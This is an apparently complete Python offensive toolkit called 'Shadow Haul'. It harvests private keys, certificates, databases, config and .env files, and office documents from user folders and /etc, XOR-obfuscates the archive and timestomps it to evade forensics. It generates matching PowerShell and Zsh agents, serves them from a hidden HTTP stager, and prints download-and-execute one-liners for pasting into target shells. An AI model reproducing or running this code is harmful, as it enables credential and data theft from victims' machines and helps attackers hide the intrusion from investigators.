#!/usr/bin/env python3
import sys
import os
import http.server
import socketserver
import threading
import subprocess
import platform
import zipfile
import time

server_instance = None
server_thread = None
lhost = None
lport = None

def print_banner():
    print("=" * 80)
    print(" " * 34 + "SHADOW HAUL")
    print(" " * 22 + "ADVANCED ANTI-FORENSIC EXFILTRATION SUITE")
    print("=" * 80 + "\n")

def get_automated_target_paths():
    """Dynamically calculates the most critical data sectors across all standard OS baselines."""
    home = os.path.expanduser("~")
    discovered_paths = []
    
    # Standard high-value corporate user spaces
    standard_targets = ["Documents", "Desktop", "Downloads", "Development", "Workspace", "Projects"]
    
    for folder in standard_targets:
        target_path = os.path.join(home, folder)
        if os.path.exists(target_path):
            discovered_paths.append(target_path)
            
    # Include default system configuration paths dynamically based on active platform environment
    if platform.system() == "Linux" or platform.system() == "Darwin":
        if os.path.exists("/etc"): discovered_paths.append("/etc")
        
    return discovered_paths

def zip_target_assets(output_zip):
    """Automatically loops through discovered paths, filters extensions, and avoids restricted loops."""
    target_extensions = (
        '.key', '.pem', '.pub', '.crt', '.cer', '.p12', '.pfx',
        '.csv', '.xlsx', '.xls', '.sql', '.db', '.sqlite',
        '.conf', '.config', '.yaml', '.yml', '.json', '.ini', '.inf', '.env',
        '.pdf', '.docx', '.doc', '.pptx', '.ppt', '.txt'
    )
    # Explicit folder exclusions to prevent permission blocks or dead locks
    ignored_patterns = ['appdata', 'local/cache', 'microsoft', 'google/chrome', '.git', '.cache']
    file_count = 0
    target_paths = get_automated_target_paths()
    
    try:
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for source_dir in target_paths:
                for root, _, files in os.walk(source_dir):
                    # Check if current path hits an excluded directory pattern
                    if any(p in root.lower() for p in ignored_patterns):
                        continue
                    for file in files:
                        if file.lower().endswith(target_extensions):
                            try:
                                full_path = os.path.join(root, file)
                                arc_name = os.path.join(os.path.basename(source_dir), os.path.relpath(full_path, source_dir))
                                zipf.write(full_path, arc_name)
                                file_count += 1
                            except (PermissionError, FileNotFoundError):
                                continue 
        if file_count > 0:
            print(f"[+] Automated discovery sweep complete. Securely packed {file_count} target assets.")
            return True
        else:
            print("[-] Automated sweep complete: Zero sensitive data assets found in standard paths.")
            return False
    except Exception as e:
        print(f"[-] Automated archive packing failure: {e}")
        return False
def obfuscate_and_scrub(input_file, output_file, key_string):
    """Applies a symmetric XOR mask, timestamps the output, and scrubs the key from RAM."""
    try:
        with open(input_file, 'rb') as f:
            data = bytearray(f.read())
        
        key_bytes = bytearray(key_string.encode('utf-8'))
        obfuscated = bytearray(len(data))
        
        # Perform the symmetric header scrambling calculation
        for i in range(len(data)):
            obfuscated[i] = data[i] ^ key_bytes[i % len(key_bytes)]
            
        with open(output_file, 'wb') as f:
            f.write(obfuscated)
            
        # --- ANTI-FORENSIC MEMORY SCRUBBING ---
        # Programmatically overwrite key memory allocations with zeros to block RAM extraction
        for i in range(len(key_bytes)):
            key_bytes[i] = 0x00
        del key_string
        
        # --- METADATA TIMESTOMPING ---
        # Copy timestamps from a standard configuration file to blend into system timelines
        reference_file = "/etc/hosts" if platform.system() != "Windows" else "C:\\Windows\\System32\\drivers\\etc\\hosts"
        if os.path.exists(reference_file):
            ref_stat = os.stat(reference_file)
            os.utime(output_file, (ref_stat.st_atime, ref_stat.st_mtime))
            
        return True
    except Exception as e:
        print(f"[-] Advanced cryptographic or metadata stomping operation failed: {e}")
        return False

def generate_windows_payload():
    """Builds the native PowerShell agent with integrated directory exclusions and anti-forensics."""
    ps_code = r"""# Shadow Haul Native Automated Windows Exfiltration Agent
Clear-Host
Write-Output "================================================================================"
Write-Output "                SHADOW HAUL: AUTOMATED WINDOWS TARGET AGENT"
Write-Output "================================================================================"

$secretKey = Read-Host "[?] Enter custom cryptographic key string to encrypt the data"
if (-not $secretKey) { Write-Output "[-] Error: A cryptographic key identifier is required."; break }

$stagingFile = "$env:TEMP\loot.tmp"
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('UserProfile'), 'Desktop')
if (-not (Test-Path $desktopPath)) {
    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('UserProfile'), 'OneDrive\Desktop')
}
$finalPayload = [System.IO.Path]::Combine($desktopPath, 'haul.dat')

Write-Output "`n[*] Mapping Windows environment profiles and identifying target sectors..."
$userHome = [System.Environment]::GetFolderPath('UserProfile')
$targetFolders = @("Documents", "Desktop", "Downloads", "Development", "Workspace", "Projects")
$targetExtensions = @('.key', '.pem', '.pub', '.crt', '.cer', '.p12', '.pfx',
                    '.csv', '.xlsx', '.xls', '.sql', '.db', '.sqlite',
                    '.conf', '.config', '.yaml', '.yml', '.json', '.ini', '.inf', '.env',
                    '.pdf', '.docx', '.doc', '.pptx', '.ppt', '.txt')
$ignoredPatterns = @("appdata", "local\cache", "microsoft", "google\chrome", ".git", ".cache")

$lootDir = "$env:TEMP\shadow_loot"
if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null

$fileCount = 0
foreach ($folder in $targetFolders) {
    $fullPath = Join-Path $userHome $folder
    if (Test-Path $fullPath) {
        Write-Output "    -> Indexing target workspace sector: $folder"
        $files = Get-ChildItem -Path $fullPath -Recurse -File -ErrorAction SilentlyContinue
        
        foreach ($file in $files) {
            if ($targetExtensions -contains $file.Extension.ToLower()) {
                if ($ignoredPatterns | Where-Object { $file.FullName.ToLower().Contains($_) }) { continue }
                try {
                    $subFolder = Join-Path $lootDir $folder
                    if (-not (Test-Path $subFolder)) { New-Item -ItemType Directory -Path $subFolder -Force | Out-Null }
                    Copy-Item $file.FullName -Destination $subFolder -ErrorAction SilentlyContinue
                    $fileCount++
                } catch { continue }
            }
        }
    }
}

if ($fileCount -eq 0) {
    Write-Output "[-] Automated sweep complete: Zero sensitive data assets discovered."; if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }; break
}

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    if (Test-Path $stagingFile) { Remove-Item $stagingFile -Force }
    [System.IO.Compression.ZipFile]::CreateFromDirectory($lootDir, $stagingFile)
    
    Write-Output "[*] Running symmetric XOR scrambling and memory scrubbing..."
    $data = [System.IO.File]::ReadAllBytes($stagingFile)
    $keyBytes = [System.Text.Encoding]::UTF-8.GetBytes($secretKey)
    $obfuscated = New-Object byte[] $data.Length
    
    for ($i = 0; $i -lt $data.Length; $i++) {
        $obfuscated[$i] = $data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    [System.IO.File]::WriteAllBytes($finalPayload, $obfuscated)
    
    # --- WINDOWS TIMESTOMPING ---
    $refFile = "C:\Windows\System32\drivers\etc\hosts"
    if (Test-Path $refFile) {
        (Get-Item $finalPayload).CreationTime = (Get-Item $refFile).CreationTime
        (Get-Item $finalPayload).LastWriteTime = (Get-Item $refFile).LastWriteTime
        (Get-Item $finalPayload).LastAccessTime = (Get-Item $refFile).LastAccessTime
    }
    
    # --- MEMORY OBFUSCATION CLEANUP ---
    for ($i = 0; $i -lt $keyBytes.Length; $i++) { $keyBytes[$i] = 0 }
    $secretKey = $null
    
    Write-Output "`n================================================================================"
    Write-Output "[+] SUCCESS: Fully automated system data sweep completed!"
    Write-Output "[+] EXFILTRATION PAYLOAD PATH: $finalPayload"
    Write-Output "[*] ANTI-FORENSICS: Key scrubbed from RAM. Payload timestomped to match system configuration."
    Write-Output "================================================================================"
    
    if (Test-Path $stagingFile) { Remove-Item $stagingFile -Force }
    if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }
} catch {
    Write-Output "[-] Execution failure: $_"; if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }
}
"""
    return ps_code
def generate_mac_payload():
    """Builds the native Zsh script with memory scrubbing and timestomping for macOS."""
    return r"""#!/bin/zsh
clear
echo "================================================================================"
echo "                SHADOW HAUL: AUTOMATED MACOS TARGET AGENT"
echo "================================================================================"

echo -n "[?] Enter custom cryptographic key string to encrypt the data: "
read secret_key
if [ -z "$secret_key" ]; then echo "[-] Error: Encryption key required."; exit 1; fi

staging_file="/tmp/loot.tmp"
final_payload="$HOME/haul.dat"
loot_dir="/tmp/shadow_loot"

echo "\n[*] Mapping macOS environment profiles and identifying target sectors..."
rm -rf "$loot_dir" 2>/dev/null
mkdir -p "$loot_dir"

target_folders=("Documents" "Desktop" "Downloads" "Development" "Workspace" "Projects")
file_count=0

for folder in $target_folders; do
    target_path="$HOME/$folder"
    if [ -d "$target_path" ]; then
        echo "    -> Indexing target workspace sector: $folder"
        mkdir -p "$loot_dir/$folder"
        
        find -E "$target_path" -type f \( -name "*.key" -o -name "*.pem" -o -name "*.pub" -o \
            -name "*.crt" -o -name "*.cer" -o -name "*.p12" -o -name "*.pfx" -o \
            -name "*.csv" -o -name "*.xlsx" -o -name "*.xls" -o -name "*.sql" -o \
            -name "*.db" -o -name "*.sqlite" -o -name "*.conf" -o -name "*.config" -o \
            -name "*.yaml" -o -name "*.yml" -o -name "*.json" -o -name "*.ini" -o \
            -name "*.inf" -o -name "*.env" -o -name "*.pdf" -o -name "*.docx" -o \
            -name "*.doc" -o -name "*.pptx" -o -name "*.ppt" -o -name "*.txt" \) 2>/dev/null | while read file; do
                if [[ "$file" =~ "(appdata|cache|microsoft|chrome|.git)" ]]; then continue; fi
                cp "$file" "$loot_dir/$folder/" 2>/dev/null
                ((file_count++))
        done
    fi
done

if [ "$file_count" -eq 0 ]; then
    echo "[-] Automated sweep complete: Zero sensitive data assets found."; rm -rf "$loot_dir"; exit 1
fi

echo "[+] Discovery sweep complete. Packing assets into staging container."
cd "$loot_dir" 2>/dev/null; zip -r "$staging_file" . >/dev/null 2>&1; cd - >/dev/null

echo "[*] Running symmetric XOR scrambling, memory scrubbing, and timestomping..."
python3 -c "
import os
with open('$staging_file', 'rb') as f: data = bytearray(f.read())
key_str = '$secret_key'
key = bytearray(key_str.encode())
obf = bytearray(b ^ key[i % len(key)] for i, b in enumerate(data))
with open('$final_payload', 'wb') as f: f.write(obf)
for i in range(len(key)): key[i] = 0
if os.path.exists('/etc/hosts'):
    ref = os.stat('/etc/hosts')
    os.utime('$final_payload', (ref.st_atime, ref.st_mtime))
" 2>/dev/null

if [ -f "$final_payload" ]; then
    echo "\n================================================================================"
    echo "[+] SUCCESS: Fully automated system data sweep completed!"
    echo "[+] EXFILTRATION PAYLOAD PATH: $final_payload"
    echo "[*] ANTI-FORENSICS: Key scrubbed from RAM. Payload timestamps matched to /etc/hosts."
    echo "================================================================================"
    rm -f "$staging_file"; rm -rf "$loot_dir"
else
    echo "[-] Cryptographic operation failed."; rm -rf "$loot_dir"
fi
"""

def start_stager_server(filename, payload_content, port):
    global server_instance, server_thread
    if server_instance:
        try: server_instance.shutdown()
        except: pass
    try:
        with open(filename, "w") as f:
            f.write(payload_content)
        class QuietHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args): pass
        server_instance = socketserver.TCPServer(("0.0.0.0", int(port)), QuietHandler)
        server_thread = threading.Thread(target=server_instance.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        print(f"\n[+] Stager Online! Successfully hosting '{filename}' at http://0.0.0:{port}/{filename}")
        return True
    except Exception as e:
        print(f"[-] Staging allocation error: {e}")
        return False
def main():
    global lhost, lport
    print_banner()
    current_os = platform.system()
    print(f"[+] Local System Engine running detection routines... Local Host: {current_os}")
    
    lhost = None
    lport = None

    while True:
        print("\n--- Target Host Operating System Selector ---")
        print(" [W] Windows Payload Framework Deployment (Stager)")
        print(" [M] macOS Payload Framework Deployment (Stager)")
        print(" [L] Linux Native Distribution Module (Local Run)")
        print(" Exit Toolkit Entirely")
        
        os_choice = input("\n[?] Select Target OS (W/M/L/999): ").strip().upper()
        
        if os_choice == '999':
            print("[*] Shutting down Shadow Haul Framework.")
            if server_instance: server_instance.shutdown()
            for f in ["sh_win.ps1", "sh_mac.sh"]:
                if os.path.exists(f): os.remove(f)
            break
            
        elif os_choice == 'L':
            # Runs the local system discovery crawl natively on your local machine
            print("\n--- [L] Linux Automated Local Exfiltration Sweep ---")
            secret_key = input("[?] Enter custom cryptographic key string to encrypt the data: ").strip()
            
            if not secret_key:
                print("[-] Error: A cryptographic key identifier is strictly required to proceed.")
                continue
                
            staging_file = "loot.tmp"
            final_payload = "haul.dat"
            current_working_dir = os.getcwd()
            
            print("\n[*] Mapping local Linux environment paths and initiating automated background scraper...")
            if zip_target_assets(staging_file):
                print("[*] Running symmetric XOR cryptographic header scrambling obfuscation layer...")
                if obfuscate_and_scrub(staging_file, final_payload, secret_key):
                    print("\n" + "="*80)
                    print("[+] SUCCESS: Fully automated system data sweep completed!")
                    print(f"[+] EXFILTRATION PAYLOAD PATH: {current_working_dir}/{final_payload}")
                    print("[*] ANTI-FORENSICS: Key scrubbed from RAM. Payload timestomped to match system timeline.")
                    print("[*] NOTICE: All cleartext temporary file footprints have been scrubbed from disk.")
                    print("="*80)
                    if os.path.exists(staging_file): os.remove(staging_file)
            
        elif os_choice in ['W', 'M']:
            # Request network configurations only when establishing cross-platform stagers
            if not lhost or not lport:
                print("\n" + "*"*60)
                print("[*] WEB STAGER SETUP REQUIRED FOR CROSS-PLATFORM PACKAGING")
                print("*"*60)
                lhost = input("[?] Enter your Host Local IP (LHOST for deployment): ").strip()
                lport = input("[?] Enter Port to allocate for temporary Web Stager (e.g., 8080): ").strip()
                if not lhost or not lport:
                    print("[-] Stager attributes cannot be blank.")
                    lhost, lport = None, None
                    continue

            if os_choice == 'W':
                payload = generate_windows_payload()
                if start_stager_server("sh_win.ps1", payload, lport):
                    print("\n" + "-"*80)
                    print("[+] Paste this command into your Lock Pick Windows target shell:")
                    print(f"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/sh_win.ps1')\"")
                    print("-" * 80)
                    input("\n[*] Press Enter to return to main menu and keep hosting...")
                    
            elif os_choice == 'M':
                payload = generate_mac_payload()
                if start_stager_server("sh_mac.sh", payload, lport):
                    print("\n" + "-"*80)
                    print("[+] Paste this command into your Lock Pick macOS target shell:")
                    print(f"curl -s http://{lhost}:{lport}/sh_mac.sh | zsh")
                    print("-" * 80)
                    input("\n[*] Press Enter to return to main menu and keep hosting...")
        else:
            print("[-] Platform signature selection criteria mismatch.")

if __name__ == "__main__":
    main()
